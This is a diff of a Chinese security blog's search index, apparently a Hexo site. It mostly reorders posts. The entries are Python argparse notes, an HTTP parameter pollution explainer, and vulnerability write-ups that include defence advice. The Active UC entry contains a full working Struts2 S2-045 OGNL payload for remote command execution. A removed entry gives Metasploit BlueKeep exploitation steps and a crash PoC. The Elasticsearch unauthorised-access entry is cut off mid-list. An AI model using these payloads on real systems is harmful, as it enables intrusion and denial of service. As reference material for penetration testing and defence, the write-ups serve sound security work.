@@ -1,6 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Python3-argparse</title>
+    <url>//560821a385be.html</url>
+    <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
+<h3 id="ArgumentParser"><a href="#ArgumentParser" class="headerlink" title="ArgumentParser"></a>ArgumentParser</h3><p>作为解析器，用来包含将命令行解析成Python数据类型的全部信息</p>
+<p>语法：</p>
+<p><strong>argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=’-‘, fromfile_prefix_chars=None, argument_default=None, conflict_handler=’error’, add_help=True, allow_abbrev=True, exit_on_error=True)</strong></p>
+<p><strong>prog</strong>: 程序的名称，默认为<code>sys.argv[0]</code></p>
+<p><strong>usage</strong>: 描述程序用途的字符串（默认值：从添加到解析器的参数生成）</p>
+<p><strong>description</strong>: 在参数帮助文档之前显示的文本（默认值：None）</p>
+<p><strong>epilog</strong>: 在参数帮助文档之后显示的文本（默认值：None）</p>
+<p><strong>parents</strong>: 一个<code>ArgumentParser</code>对象的列表，他们的参数也包含在内</p>
+<p><strong>formatter_class</strong>: 用于自定义帮助文档输出格式的类</p>
+<p><strong>prefix_chars</strong>: 可选参数的前缀字符集合（默认值：’ - ‘ ）</p>
+<p><strong>fromfile_prefix_chars</strong>: 当需要从文件中读取其他参数时，用于标识文件名的前缀字符集合（默认值：None）</p>
+<p><strong>argument_default</strong>: 参数的全局默认值（默认值： None）</p>
+<p><strong>conflict_handler</strong>: 解决冲突选项的策略（通常是不必要的）</p>
+<p><strong>add_help</strong>: 为解析器添加一个 -h/–help 选项（默认值： True）</p>
+<p><strong>allow_abbrev</strong>: 如果缩写是无歧义的，则允许缩写长选项 （默认值：True）</p>
+<p><strong>exit_on_error</strong>: 决定当错误发生时是否让 <code>ArgumentParser</code> 附带错误信息退出。 (默认值: True)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(epilog=<span class="string">&#x27;\tExample: \r\npython3 &#x27;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; -u http://baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Python库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python3-urllib</title>
     <url>//e28b0e650137.html</url>
     <content><![CDATA[<h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><p>urllib是Python自带模块，通过该模块可以实现HTTP网络请求</p>
@@ -92,36 +122,6 @@
       </categories>
       <tags>
         <tag>Python3模块</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3-argparse</title>
-    <url>//560821a385be.html</url>
-    <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
-<h3 id="ArgumentParser"><a href="#ArgumentParser" class="headerlink" title="ArgumentParser"></a>ArgumentParser</h3><p>作为解析器，用来包含将命令行解析成Python数据类型的全部信息</p>
-<p>语法：</p>
-<p><strong>argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=’-‘, fromfile_prefix_chars=None, argument_default=None, conflict_handler=’error’, add_help=True, allow_abbrev=True, exit_on_error=True)</strong></p>
-<p><strong>prog</strong>: 程序的名称，默认为<code>sys.argv[0]</code></p>
-<p><strong>usage</strong>: 描述程序用途的字符串（默认值：从添加到解析器的参数生成）</p>
-<p><strong>description</strong>: 在参数帮助文档之前显示的文本（默认值：None）</p>
-<p><strong>epilog</strong>: 在参数帮助文档之后显示的文本（默认值：None）</p>
-<p><strong>parents</strong>: 一个<code>ArgumentParser</code>对象的列表，他们的参数也包含在内</p>
-<p><strong>formatter_class</strong>: 用于自定义帮助文档输出格式的类</p>
-<p><strong>prefix_chars</strong>: 可选参数的前缀字符集合（默认值：’ - ‘ ）</p>
-<p><strong>fromfile_prefix_chars</strong>: 当需要从文件中读取其他参数时，用于标识文件名的前缀字符集合（默认值：None）</p>
-<p><strong>argument_default</strong>: 参数的全局默认值（默认值： None）</p>
-<p><strong>conflict_handler</strong>: 解决冲突选项的策略（通常是不必要的）</p>
-<p><strong>add_help</strong>: 为解析器添加一个 -h/–help 选项（默认值： True）</p>
-<p><strong>allow_abbrev</strong>: 如果缩写是无歧义的，则允许缩写长选项 （默认值：True）</p>
-<p><strong>exit_on_error</strong>: 决定当错误发生时是否让 <code>ArgumentParser</code> 附带错误信息退出。 (默认值: True)</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(epilog=<span class="string">&#x27;\tExample: \r\npython3 &#x27;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; -u http://baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python库</tag>
       </tags>
   </entry>
   <entry>
@@ -289,6 +289,24 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>随笔</title>
+    <url>//692ad0fa0217.html</url>
+    <content><![CDATA[<div class="ipage">
+  <div class="ititle">标题</div>
+  <div class="izhengwen">
+    <p>正文</p>
+    <p>正文</p>
+  </div>
+</div>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
       </tags>
   </entry>
   <entry>
@@ -1896,6 +1914,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Active UC index.action远程命令执行漏洞</title>
+    <url>//20f03e999316.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
+<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;acenter&#x2F;index.action</span><br></pre></td></tr></table></figure>
+
+<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
+<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;acenter&#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;netstat -an&#39; ).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web应用漏洞</category>
+        <category>Active-UC</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Lanproxy任意文件读取-CVE-2021-3019</title>
     <url>//0e7fcf3b35d4.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
@@ -1934,33 +1979,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Active UC index.action远程命令执行漏洞</title>
-    <url>//20f03e999316.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
-<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;acenter&#x2F;index.action</span><br></pre></td></tr></table></figure>
-
-<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
-<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;acenter&#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;netstat -an&#39; ).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web应用漏洞</category>
-        <category>Active-UC</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Yapi Mock远程代码执行漏洞</title>
     <url>//8cd1c56722a1.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
@@ -1996,62 +2014,6 @@
       <tags>
         <tag>高危漏洞</tag>
         <tag>代码执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HPP参数污染漏洞</title>
-    <url>//4189faf9a367.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
-<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
-<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
-<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
-<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
-<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
-<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
-<table>
-<thead>
-<tr>
-<th align="center">web服务器</th>
-<th align="center">获取参数函数</th>
-<th align="center">获取到的参数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">PHP/Apache</td>
-<td align="center">$_GET(“test”)</td>
-<td align="center">last</td>
-</tr>
-<tr>
-<td align="center">JSP/Tomcat</td>
-<td align="center">Request.getParameter(“test”)</td>
-<td align="center">first</td>
-</tr>
-<tr>
-<td align="center">Perl(CGI)/Apache</td>
-<td align="center">Param(“test”)</td>
-<td align="center">first</td>
-</tr>
-<tr>
-<td align="center">Python/Apache</td>
-<td align="center">getvalue(“test”)</td>
-<td align="center">ALL</td>
-</tr>
-<tr>
-<td align="center">ASP/IIS</td>
-<td align="center">Request.QueryString(“test”)</td>
-<td align="center">ALL</td>
-</tr>
-</tbody></table>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
-<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>低危漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2166,6 +2128,62 @@
       </tags>
   </entry>
   <entry>
+    <title>HPP参数污染漏洞</title>
+    <url>//4189faf9a367.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
+<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
+<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
+<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
+<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
+<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">web服务器</th>
+<th align="center">获取参数函数</th>
+<th align="center">获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP/Apache</td>
+<td align="center">$_GET(“test”)</td>
+<td align="center">last</td>
+</tr>
+<tr>
+<td align="center">JSP/Tomcat</td>
+<td align="center">Request.getParameter(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Perl(CGI)/Apache</td>
+<td align="center">Param(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Python/Apache</td>
+<td align="center">getvalue(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+<tr>
+<td align="center">ASP/IIS</td>
+<td align="center">Request.QueryString(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+</tbody></table>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
+<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>低危漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
     <url>//67bda6fdaf83.html</url>
     <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
@@ -2259,49 +2277,6 @@
         <tag>跨站类漏洞</tag>
         <tag>中危漏洞</tag>
         <tag>第三方库漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
-    <url>//ddf32da2222d.html</url>
-    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
-<li>Windows 7</li>
-<li>Windows server 2008 R2</li>
-<li>Windows server 2008</li>
-<li>Windows 2003</li>
-<li>Windows xp</li>
-</ul>
-<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
-<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
-
-<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
-
-<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
-<p>2.安装安全管家类的软件</p>
-<p>3.关闭远程桌面，开启防火墙</p>
-<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>代码执行漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2402,77 +2377,46 @@
       </tags>
   </entry>
   <entry>
-    <title>Elasticsearch未授权访问</title>
-    <url>//9db3aff65775.html</url>
-    <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
-<p>​    Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索</p>
-<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>默认端口9200，9300 HTTP协议</p>
-<p>返回内容包含<code>You Know,for Search</code></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果存在该漏洞则可以访问如下路径，这些路径存在大量敏感信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;_cat</span><br><span class="line">&#x2F;_cat&#x2F;allocation</span><br><span class="line">&#x2F;_cat&#x2F;shards</span><br><span class="line">&#x2F;_cat&#x2F;shards&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;master</span><br><span class="line">&#x2F;_cat&#x2F;nodes</span><br><span class="line">&#x2F;_cat&#x2F;tasks</span><br><span class="line">&#x2F;_cat&#x2F;indices</span><br><span class="line">&#x2F;_cat&#x2F;indices&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;segments</span><br><span class="line">&#x2F;_cat&#x2F;segments&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;count</span><br><span class="line">&#x2F;_cat&#x2F;count&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;recovery</span><br><span class="line">&#x2F;_cat&#x2F;recovery&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;health</span><br><span class="line">&#x2F;_cat&#x2F;pending_tasks</span><br><span class="line">&#x2F;_cat&#x2F;aliases</span><br><span class="line">&#x2F;_cat&#x2F;aliases&#x2F;&#123;alias&#125;</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool&#x2F;&#123;thread_pools&#125;</span><br><span class="line">&#x2F;_cat&#x2F;plugins</span><br><span class="line">&#x2F;_cat&#x2F;fielddata</span><br><span class="line">&#x2F;_cat&#x2F;fielddata&#x2F;&#123;fields&#125;</span><br><span class="line">&#x2F;_cat&#x2F;nodeattrs</span><br><span class="line">&#x2F;_cat&#x2F;repositories</span><br><span class="line">&#x2F;_cat&#x2F;snapshots&#x2F;&#123;repository&#125;</span><br><span class="line">&#x2F;_cat&#x2F;templates</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors&#x2F;&#123;job_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models&#x2F;&#123;model_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds&#x2F;&#123;datafeed_id&#125;</span><br><span 